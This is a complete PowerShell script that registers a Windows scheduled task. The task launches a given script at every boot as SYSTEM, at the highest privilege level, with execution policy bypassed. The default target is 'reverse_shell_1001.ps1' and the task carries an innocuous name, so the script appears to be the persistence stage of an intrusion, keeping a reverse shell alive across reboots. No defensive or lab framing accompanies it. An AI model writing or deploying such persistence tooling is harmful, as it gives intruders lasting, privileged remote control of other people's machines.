# Create-BootScript.ps1
# This script creates a scheduled task to run another PowerShell script at boot

param(
    [Parameter(Mandatory=$false)]
    [string]$ScriptName = "reverse_shell_1001.ps1",
    
    [Parameter(Mandatory=$false)]
    [string]$TaskName = "MyBootScript"
)

# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "This script must be run as Administrator!"
    exit 1
}

# Build the script path
$ScriptPath = Join-Path $PWD $ScriptName

# Check if the script file exists
if (-not (Test-Path $ScriptPath)) {
    Write-Error "Script file not found: $ScriptPath"
    Write-Host "Available .ps1 files in current directory:"
    Get-ChildItem -Path $PWD -Filter "*.ps1" | Select-Object Name
    exit 1
}

Write-Host "Creating scheduled task for: $ScriptPath"

# Create the scheduled task components
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File `"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnDemand -DontStopIfGoingOnBatteries

# Register the scheduled task
try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
    Write-Host "✓ Scheduled task '$TaskName' created successfully!" -ForegroundColor Green
    Write-Host "Script '$ScriptName' will run at system startup." -ForegroundColor Green
}
catch {
    Write-Error "Failed to create scheduled task: $($_.Exception.Message)"
    exit 1
}

# Show the created task
Write-Host "`nTask details:"
Get-ScheduledTask -TaskName $TaskName | Select-Object TaskName, State, TaskPath
